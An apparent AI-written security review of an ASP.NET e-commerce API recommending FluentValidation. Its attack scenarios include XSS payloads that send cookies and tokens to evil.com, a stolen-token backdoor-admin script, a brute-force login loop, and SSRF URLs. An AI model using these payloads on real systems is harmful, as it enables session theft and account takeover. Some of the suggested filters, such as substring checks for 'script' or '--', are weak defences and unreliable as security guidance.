# Input Validation Security Analysis

## Executive Summary

Your project relies **exclusively on DataAnnotations** for validation, which leaves significant security gaps. While you're protected from SQL injection (thanks to EF Core), you're vulnerable to:

1. **Stored XSS attacks** (malicious JavaScript in product names, descriptions)
2. **Business logic bypass** (creating products with invalid references)
3. **Resource exhaustion** (sending 10,000 items in collections)
4. **Data integrity issues** (invalid relationships, duplicate data)

**Risk Level:** 🟡 **Medium-High** (not immediately exploitable like SQL injection, but exploitable by determined attackers)

---

## Current State: What I Found in Your Code

### ✅ Good News: No Raw SQL Found

I searched your codebase - you don't use `ExecuteSqlRaw` or `FromSqlRaw`, which means:
- ✅ **Protected from SQL Injection** (EF Core uses parameterized queries)
- ✅ **No direct database manipulation vulnerabilities**

### ❌ Bad News: Multiple Validation Gaps

Let me show you real vulnerabilities in your code:

---

## Vulnerability #1: Stored XSS in Product Data

### Current Code (VULNERABLE)
**File:** [src/Core/Dtos/Products/CreateProductDto.cs](src/Core/Dtos/Products/CreateProductDto.cs:11-14)

```csharp
[Required]
[MaxLength(100)]
public required string Name { get; set; }

[Required]
[MaxLength(100)]
public required string Description { get; set; }

public string? PhotoUrl { get; set; }  // ⚠️ NO VALIDATION AT ALL!
```

### Attack Scenario

**Step 1: Attacker creates malicious product**
```http
POST /api/v1/product/create
Authorization: Bearer {valid-token}
Content-Type: application/json

{
  "name": "<img src=x onerror=alert(document.cookie)>",
  "description": "<script>fetch('https://evil.com/steal?token='+localStorage.getItem('token'))</script>",
  "photoUrl": "javascript:alert('XSS')",
  "categoryId": "valid-guid",
  "productBrandId": "valid-guid"
}
```

**Step 2: Data is stored (no sanitization)**
```csharp
// ProductService.cs - Line 32
entity = dto.Adapt<Product>();  // Mapster directly maps malicious data
await productRepo.AddAsync(entity);
await _unitOfWork.SaveChangesAsync();  // Saved to database!
```

**Step 3: Admin views product list**
```typescript
// Frontend Angular code (typical)
<div class="product-name" [innerHTML]="product.name"></div>
<!-- JavaScript executes in admin's browser! -->
```

**Impact:**
- ✅ Attacker steals admin's JWT token
- ✅ Attacker can now perform admin actions
- ✅ Can create new admin users
- ✅ Can delete all products
- ✅ Can modify prices to $0

### Why DataAnnotations Can't Fix This

```csharp
// DataAnnotations CAN'T do this:
[NoHTML]  // Doesn't exist!
[SafeUrl] // Doesn't exist!
[Sanitize] // Doesn't exist!
```

---

## Vulnerability #2: Business Logic Bypass

### Current Code (VULNERABLE)
**File:** [src/API/Services/ProductService.cs:22-42](src/API/Services/ProductService.cs)

```csharp
public async Task<ProductDto> AddOrUpdateProductAsync(CreateProductDto dto)
{
    var productRepo = _unitOfWork.Repository<Product>();
    Product? entity = null;

    if (dto.Id.HasValue && dto.Id != Guid.Empty)
    {
        entity = await productRepo.GetByIdAsync(dto.Id.Value);
    }

    if (entity == null)
    {
        entity = dto.Adapt<Product>();  // ⚠️ No validation!
        await productRepo.AddAsync(entity);
    }
    // ...
}
```

### Attack Scenario

**Attacker sends invalid data:**
```json
{
  "name": "Fake Product",
  "description": "Test",
  "categoryId": "00000000-0000-0000-0000-000000000000",  // Non-existent!
  "productBrandId": "99999999-9999-9999-9999-999999999999"  // Non-existent!
}
```

**What Happens:**
1. ✅ Passes DataAnnotations (Guid is not empty)
2. ✅ Mapster maps it to Product entity
3. ❌ Database insert **FAILS** with foreign key constraint violation
4. ❌ Returns 500 Internal Server Error (ugly, leaks DB info)

**Better Attack:**
```json
{
  "categoryId": "{real-category-id}",
  "productBrandId": "{real-brand-id}",
  "properties": [
    /* 10,000 properties - causes memory exhaustion */
    {"name": "prop1", "value": "val1"},
    {"name": "prop2", "value": "val2"},
    // ... repeat 10,000 times
  ]
}
```

**Impact:**
- ❌ Server runs out of memory
- ❌ Denial of Service (DoS)
- ❌ All users affected

---

## Vulnerability #3: Login Endpoint Has ZERO Validation

### Current Code (CRITICAL)
**File:** [src/Core/Dtos/Users/LoginDto.cs](src/Core/Dtos/Users/LoginDto.cs)

```csharp
public class LoginDto
{
    public required string Email { get; set; }     // ⚠️ NO VALIDATION!
    public required string Password { get; set; }  // ⚠️ NO VALIDATION!
}
```

### Attack Scenarios

#### Attack 1: Resource Exhaustion
```json
{
  "email": "A".repeat(10000000),  // 10 MB of data
  "password": "B".repeat(10000000)
}
```

**Impact:**
- Server allocates 20MB per request
- 100 concurrent requests = 2GB memory
- Server crashes (DoS)

#### Attack 2: Brute Force (No Rate Limiting on Input)
```javascript
// Attacker script
for (let i = 0; i < 1000000; i++) {
  fetch('/api/v1/account/login', {
    method: 'POST',
    body: JSON.stringify({
      email: 'admin@mail.com',
      password: 'password' + i
    })
  });
}
```

**Current Protection:** You have `RefreshRateLimitMiddleware` but **NOT on login endpoint!**

---

## Vulnerability #4: Display Name Can Be Anything

### Current Code
**File:** [src/Core/Dtos/Users/RegisterDto.cs](src/Core/Dtos/Users/RegisterDto.cs)

```csharp
[Required]
public required string DisplayName { get; set; }  // ⚠️ No MaxLength!
```

### Attack Scenario
```json
{
  "displayName": "<script>alert('XSS')</script>",
  "email": "attacker@mail.com",
  "password": "ValidPass123!"
}
```

**What Happens:**
1. User registered successfully
2. Admin views user list
3. JavaScript executes in admin's browser
4. Session hijacked

**Or worse:**
```json
{
  "displayName": "A".repeat(1000000),  // 1 MB display name
  "email": "test@mail.com",
  "password": "ValidPass123!"
}
```

**Impact:**
- Database bloat
- Slow queries (retrieving 1MB per user)
- Rendering issues on frontend

---

## Vulnerability #5: PhotoUrl Can Contain Malicious URLs

### Current Code
```csharp
public string? PhotoUrl { get; set; }  // ⚠️ Accepts ANY string!
```

### Attack Scenarios

#### Scenario 1: XSS via JavaScript URLs
```json
{
  "photoUrl": "javascript:alert(document.cookie)"
}
```

#### Scenario 2: SSRF (Server-Side Request Forgery)
```json
{
  "photoUrl": "http://internal-server:8080/admin/delete-all"
}
```

If your frontend/backend tries to fetch this URL:
- ❌ Can access internal network
- ❌ Can make requests to internal services
- ❌ Can bypass firewall

#### Scenario 3: Data Exfiltration
```json
{
  "photoUrl": "https://evil.com/track?user=admin&ip=1.2.3.4"
}
```

When displayed:
```html
<img src="https://evil.com/track?user=admin&ip=1.2.3.4">
<!-- Evil.com now knows admin IP, browser, etc. -->
```

---

## Why FluentValidation Solves These Problems

### Feature Comparison

| Capability | DataAnnotations | FluentValidation |
|------------|-----------------|------------------|
| Required fields | ✅ | ✅ |
| String length | ✅ | ✅ |
| Regex patterns | ✅ | ✅ |
| Custom validation logic | ❌ | ✅ |
| Async validation (DB lookups) | ❌ | ✅ |
| Cross-field validation | ❌ Limited | ✅ |
| Conditional validation | ❌ | ✅ |
| Collection validation | ❌ | ✅ |
| Custom error messages | ⚠️ Limited | ✅ |
| Business rule validation | ❌ | ✅ |
| URL validation | ❌ | ✅ |
| Dependency injection | ❌ | ✅ |
| Testable validators | ⚠️ Difficult | ✅ |

---

## How FluentValidation Would Fix Your Code

### Example 1: Secure Product Validation

**Current (INSECURE):**
```csharp
public class CreateProductDto
{
    [Required]
    [MaxLength(100)]
    public required string Name { get; set; }

    public string? PhotoUrl { get; set; }  // ⚠️ Vulnerable!
}
```

**With FluentValidation (SECURE):**
```csharp
public class CreateProductDtoValidator : AbstractValidator<CreateProductDto>
{
    private readonly IUnitOfWork _unitOfWork;

    public CreateProductDtoValidator(IUnitOfWork unitOfWork)
    {
        _unitOfWork = unitOfWork;

        // Name validation
        RuleFor(x => x.Name)
            .NotEmpty().WithMessage("Product name is required")
            .Length(1, 100).WithMessage("Product name must be 1-100 characters")
            .Must(BeValidProductName).WithMessage("Product name contains invalid characters")
            .MustAsync(BeUniqueName).WithMessage("A product with this name already exists");

        // Description validation
        RuleFor(x => x.Description)
            .NotEmpty()
            .Length(1, 500)
            .Must(NotContainHTML).WithMessage("Description cannot contain HTML");

        // PhotoUrl validation
        RuleFor(x => x.PhotoUrl)
            .Must(BeValidUrl).WithMessage("Invalid photo URL")
            .Must(BeHttpsUrl).WithMessage("Photo URL must use HTTPS")
            .Must(NotBeJavaScriptUrl).WithMessage("JavaScript URLs are not allowed");

        // CategoryId validation (async DB check!)
        RuleFor(x => x.CategoryId)
            .NotEmpty()
            .MustAsync(CategoryExists).WithMessage("Category does not exist");

        // ProductBrandId validation
        RuleFor(x => x.ProductBrandId)
            .NotEmpty()
            .MustAsync(BrandExists).WithMessage("Brand does not exist");

        // Properties collection validation
        RuleFor(x => x.Properties)
            .Must(x => x.Count <= 50).WithMessage("Maximum 50 properties allowed")
            .ForEach(property => {
                property.ChildRules(p => {
                    p.RuleFor(x => x.Name).NotEmpty().MaximumLength(50);
                    p.RuleFor(x => x.Value).NotEmpty().MaximumLength(200);
                });
            });
    }

    private bool BeValidProductName(string name)
    {
        // No HTML tags, script tags, etc.
        return !name.Contains('<') && !name.Contains('>') && !name.Contains("script");
    }

    private async Task<bool> BeUniqueName(CreateProductDto dto, string name, CancellationToken ct)
    {
        var existing = await _unitOfWork.Repository<Product>()
            .FirstOrDefaultAsync(new ProductByNameSpecification(name));

        // If updating, allow same name
        if (dto.Id.HasValue && existing?.Id == dto.Id.Value)
            return true;

        return existing == null;
    }

    private bool NotContainHTML(string text)
    {
        return !text.Contains('<') && !text.Contains('>');
    }

    private bool BeValidUrl(string? url)
    {
        if (string.IsNullOrWhiteSpace(url)) return true; // Optional field
        return Uri.TryCreate(url, UriKind.Absolute, out var uri)
               && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps);
    }

    private bool BeHttpsUrl(string? url)
    {
        if (string.IsNullOrWhiteSpace(url)) return true;
        return url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
    }

    private bool NotBeJavaScriptUrl(string? url)
    {
        if (string.IsNullOrWhiteSpace(url)) return true;
        return !url.StartsWith("javascript:", StringComparison.OrdinalIgnoreCase)
               && !url.StartsWith("data:", StringComparison.OrdinalIgnoreCase);
    }

    private async Task<bool> CategoryExists(Guid categoryId, CancellationToken ct)
    {
        var category = await _unitOfWork.Repository<Category>().GetByIdAsync(categoryId);
        return category != null && !category.IsDeleted;
    }

    private async Task<bool> BrandExists(Guid brandId, CancellationToken ct)
    {
        var brand = await _unitOfWork.Repository<ProductBrand>().GetByIdAsync(brandId);
        return brand != null && !brand.IsDeleted;
    }
}
```

**Benefits:**
- ✅ Prevents XSS (no HTML in name/description)
- ✅ Validates URLs are real HTTPS URLs
- ✅ Blocks JavaScript URLs
- ✅ Checks CategoryId/BrandId exist in database (async!)
- ✅ Prevents duplicate product names
- ✅ Limits collection size (max 50 properties)
- ✅ Clear, actionable error messages

### Example 2: Secure Login Validation

**Current (INSECURE):**
```csharp
public class LoginDto
{
    public required string Email { get; set; }     // No validation!
    public required string Password { get; set; }
}
```

**With FluentValidation (SECURE):**
```csharp
public class LoginDtoValidator : AbstractValidator<LoginDto>
{
    public LoginDtoValidator()
    {
        RuleFor(x => x.Email)
            .NotEmpty().WithMessage("Email is required")
            .EmailAddress().WithMessage("Invalid email format")
            .MaximumLength(255).WithMessage("Email too long")
            .Must(NotContainDangerousCharacters).WithMessage("Email contains invalid characters");

        RuleFor(x => x.Password)
            .NotEmpty().WithMessage("Password is required")
            .MinimumLength(6).WithMessage("Password must be at least 6 characters")
            .MaximumLength(128).WithMessage("Password too long");
    }

    private bool NotContainDangerousCharacters(string email)
    {
        // Prevent injection attempts
        return !email.Contains('<') && !email.Contains('>') && !email.Contains("--");
    }
}
```

**Protection Added:**
- ✅ Prevents 10MB email DoS attack (max 255 chars)
- ✅ Validates email format
- ✅ Prevents password > 128 chars (bcrypt limit)
- ✅ Blocks SQL injection attempts (no `--` comments)

### Example 3: Secure Registration

**With FluentValidation:**
```csharp
public class RegisterDtoValidator : AbstractValidator<RegisterDto>
{
    private readonly UserManager<AppUser> _userManager;

    public RegisterDtoValidator(UserManager<AppUser> userManager)
    {
        _userManager = userManager;

        RuleFor(x => x.DisplayName)
            .NotEmpty().WithMessage("Display name is required")
            .Length(2, 50).WithMessage("Display name must be 2-50 characters")
            .Must(NotContainHTML).WithMessage("Display name cannot contain HTML")
            .Must(BeAlphanumericWithSpaces).WithMessage("Display name can only contain letters, numbers, and spaces");

        RuleFor(x => x.Email)
            .NotEmpty()
            .EmailAddress()
            .MaximumLength(255)
            .MustAsync(BeUniqueEmail).WithMessage("Email is already taken");

        RuleFor(x => x.Password)
            .NotEmpty()
            .MinimumLength(12).WithMessage("Password must be at least 12 characters") // Stronger!
            .MaximumLength(128)
            .Matches(@"[A-Z]").WithMessage("Password must contain uppercase letter")
            .Matches(@"[a-z]").WithMessage("Password must contain lowercase letter")
            .Matches(@"[0-9]").WithMessage("Password must contain digit")
            .Matches(@"[^a-zA-Z0-9]").WithMessage("Password must contain special character")
            .Must(NotContainCommonPasswords).WithMessage("Password is too common");
    }

    private bool NotContainHTML(string text)
    {
        return !text.Contains('<') && !text.Contains('>') && !text.Contains("script", StringComparison.OrdinalIgnoreCase);
    }

    private bool BeAlphanumericWithSpaces(string name)
    {
        return name.All(c => char.IsLetterOrDigit(c) || char.IsWhiteSpace(c));
    }

    private async Task<bool> BeUniqueEmail(string email, CancellationToken ct)
    {
        var user = await _userManager.FindByEmailAsync(email);
        return user == null;
    }

    private bool NotContainCommonPasswords(string password)
    {
        // Check against common password list
        var commonPasswords = new[] { "password", "123456", "qwerty", "admin" };
        return !commonPasswords.Any(p => password.Contains(p, StringComparison.OrdinalIgnoreCase));
    }
}
```

---

## Real-World Attack Impact

### Scenario: E-Commerce Site Compromise

**Day 1 - Reconnaissance:**
- Attacker creates account: `test@evil.com`
- Tests input fields for XSS vulnerabilities
- Discovers product name accepts HTML

**Day 2 - XSS Payload Deployment:**
```json
POST /api/v1/product/create
{
  "name": "Nike Shoes<img src=x onerror=fetch('https://evil.com/log',{method:'POST',body:document.cookie})>",
  "description": "Great shoes",
  "categoryId": "{valid}",
  "productBrandId": "{valid}"
}
```

**Day 3 - Waiting:**
- Malicious product sits in database
- Waiting for admin to view product list

**Day 4 - Admin Opens Dashboard:**
1. Admin logs in (valid session)
2. Navigates to Products page
3. XSS payload executes
4. Admin's JWT token sent to `evil.com`

**Day 5 - Full Compromise:**
```javascript
// Attacker's script (now has admin token)
fetch('https://yoursite.com/api/v1/account/register', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer {stolen-admin-token}' },
  body: JSON.stringify({
    email: 'backdoor@evil.com',
    password: 'SecretBackdoor123!',
    displayName: 'Backup Admin'
  })
});

// Add backdoor user to Admin role
fetch('https://yoursite.com/api/v1/role/assign', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer {stolen-admin-token}' },
  body: JSON.stringify({
    userId: '{backdoor-user-id}',
    roleId: '{admin-role-id}'
  })
});
```

**Day 6 - Data Exfiltration:**
- Attacker logs in as backdoor admin
- Downloads all customer data
- Downloads all order history
- Lists all users with passwords hashes

**Impact:**
- 💰 GDPR fine: €20 million or 4% of annual revenue
- 📉 Customer trust destroyed
- 📰 Negative press coverage
- 🏛️ Potential lawsuits
- 💸 Regulatory investigations

---

## Implementation Guide

### Step 1: Install FluentValidation

```bash
dotnet add src/API package FluentValidation.AspNetCore
```

### Step 2: Register in ConfigureServices

```csharp
// src/API/Extensions/ConfigureServices.cs
services.AddFluentValidationAutoValidation();
services.AddFluentValidationClientsideAdapters();
services.AddValidatorsFromAssemblyContaining<CreateProductDtoValidator>();
```

### Step 3: Create Validators

Create folder: `src/API/Validators/`

Files:
- `CreateProductDtoValidator.cs`
- `CreateCategoryDtoValidator.cs`
- `LoginDtoValidator.cs`
- `RegisterDtoValidator.cs`
- etc.

### Step 4: Update Controllers (Automatic!)

FluentValidation integrates automatically:

```csharp
[HttpPost("create")]
public async Task<ActionResult<ApiSuccessResponse<ProductDto>>> Create([FromBody] CreateProductDto dto)
{
    // FluentValidation runs BEFORE this line!
    // If validation fails, returns 400 Bad Request automatically

    var result = await _productService.AddOrUpdateProductAsync(dto);
    return Ok(ResponseFactory.Ok(result));
}
```

### Step 5: Customize Error Response

```csharp
// src/API/Middlewares/ValidationExceptionMiddleware.cs
public class ValidationExceptionMiddleware
{
    private readonly RequestDelegate _next;

    public async Task InvokeAsync(HttpContext context)
    {
        try
        {
            await _next(context);
        }
        catch (ValidationException ex)
        {
            context.Response.StatusCode = 400;
            var errors = ex.Errors.Select(e => new { e.PropertyName, e.ErrorMessage });
            await context.Response.WriteAsJsonAsync(new ApiErrorResponse(400, "Validation failed", errors));
        }
    }
}
```

---

## Priority: Which Validators to Create First

### 🔴 Critical (Create Immediately)

1. **LoginDtoValidator** - Most attacked endpoint
2. **RegisterDtoValidator** - Account takeover risk
3. **CreateProductDtoValidator** - XSS vulnerability
4. **CreateCategoryDtoValidator** - Admin endpoint

### 🟡 High Priority

5. **CreateOrderDtoValidator** - Financial impact
6. **CreatePriceAdjustmentDtoValidator** - Pricing integrity
7. **CreateProductSkuDtoValidator** - Inventory integrity

### 🟢 Medium Priority

8. **CreateColorDtoValidator**
9. **CreateSizeValidator**
10. **CreateBrandDtoValidator**

---

## Estimated Effort

| Task | Time Estimate |
|------|---------------|
| Install FluentValidation | 5 minutes |
| Register in DI | 10 minutes |
| Create LoginDtoValidator | 30 minutes |
| Create RegisterDtoValidator | 45 minutes |
| Create CreateProductDtoValidator | 1-2 hours |
| Create remaining 10 validators | 3-4 hours |
| Write unit tests for validators | 2-3 hours |
| **Total** | **1-2 days** |

---

## Testing Your Validators

```csharp
public class CreateProductDtoValidatorTests
{
    private readonly CreateProductDtoValidator _validator;

    public CreateProductDtoValidatorTests()
    {
        // Setup mock UnitOfWork
        var mockUoW = new Mock<IUnitOfWork>();
        _validator = new CreateProductDtoValidator(mockUoW.Object);
    }

    [Fact]
    public void Should_Fail_When_Name_Contains_HTML()
    {
        var dto = new CreateProductDto
        {
            Name = "<script>alert('xss')</script>",
            Description = "Test",
            CategoryId = Guid.NewGuid(),
            ProductBrandId = Guid.NewGuid()
        };

        var result = _validator.Validate(dto);

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.PropertyName == "Name");
    }

    [Fact]
    public void Should_Fail_When_PhotoUrl_Is_JavaScript()
    {
        var dto = new CreateProductDto
        {
            Name = "Valid Product",
            Description = "Test",
            PhotoUrl = "javascript:alert('xss')",
            CategoryId = Guid.NewGuid(),
            ProductBrandId = Guid.NewGuid()
        };

        var result = _validator.Validate(dto);

        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.PropertyName == "PhotoUrl");
    }
}
```

---

## Conclusion

**Your current DataAnnotations-only approach:**
- ✅ Protects against SQL injection (EF Core helps)
- ❌ **DOES NOT** protect against XSS
- ❌ **DOES NOT** validate business rules
- ❌ **DOES NOT** check database relationships
- ❌ **DOES NOT** prevent resource exhaustion
- ❌ **DOES NOT** provide good error messages

**With FluentValidation:**
- ✅ All of the above
- ✅ Testable validation logic
- ✅ Reusable validation rules
- ✅ Clear separation of concerns
- ✅ Better developer experience

**Risk Level Without FluentValidation:** 🟡 Medium-High
**Estimated Time to Fix:** 1-2 days
**ROI:** Prevents potentially catastrophic security breaches

**My Recommendation:** Implement FluentValidation validators for your critical DTOs (Login, Register, CreateProduct) **before going to production**.

---

*Last Updated: 2025-11-14*
